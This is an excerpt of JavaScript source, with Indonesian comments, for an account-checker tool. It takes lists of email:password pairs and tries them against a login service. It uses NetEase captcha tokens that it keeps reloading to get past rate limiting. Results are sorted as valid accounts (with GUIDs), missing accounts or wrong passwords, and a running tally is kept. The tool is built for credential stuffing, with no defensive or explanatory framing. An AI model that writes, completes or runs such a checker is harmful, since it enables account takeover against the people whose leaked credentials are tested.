...
let currentIndex = 0;
let stats = { total: 0, checked: 0, valid: 0, notFound: 0, wrongPass: 0, error: 0 };
...
// --- Captcha Logic ---
function updateTokenCounter() { tokenCountEl.innerText = tokens.length; }
    ...
    initNECaptcha({
        ...
        onVerify: function (err, data) {
            if (!err) {
                ...
                updateTokenCounter();
                loadCaptcha(captchaId, elementId); // Muat ulang captcha
            }
        }
    }, null, (err) => console.error("Captcha error:", err));
}
...
async function checkAccount(email, password) {
    ...
    if (!e_captcha) return { status: 'error', message: 'Token captcha habis!' };
    try {
        ...
        if (code === 0 && responseData) return { status: 'valid', message: `GUID: ${responseData.guid || "N/A"}` };
        if (code === 1004) return { status: 'notfound', message: 'Error_NoAccount' };
        if (code === 1005) return { status: 'wrongpass', message: 'Error_PasswdError' };
...
// --- Control Flow ---
function updateStats() { statsEl.textContent = `Total: ${stats.total} | Checked: ${stats.checked} | Valid: ${stats.valid} | Not Found: ${stats.notFound} | Wrong Pass: ${stats.wrongPass} | Error: ${stats.error}`; }
...
async function mainLoop() {
    while (isChecking && currentIndex < accountsToCheck.length) {
        ...
        if (isChecking) { // Pastikan status tidak berubah saat menunggu
...
function startProcess(isResume) {
    ...
    if (!isResume) {
        ...
        accountsToCheck = rawList.filter(line => line.includes(':') || line.includes('|')).map(line => {
            ...
            return { email: parts[0].trim(), password: parts.slice(1).join(separator).trim(), original: line };
        });
        if (accountsToCheck.length === 0) { alert('List akun kosong atau formatnya salah!'); return; }
        currentIndex = 0;
        resultsEl.innerHTML = '';
    ...
    updateStatus(isResume ? 'Melanjutkan pengecekan...' : 'Memulai pengecekan...');
    updateStats();
    mainLoop();
}

startButton.addEventListener('click', () => {
    const isResume = currentIndex > 0 && currentIndex < accountsToCheck.length;
    startProcess(isResume);
});
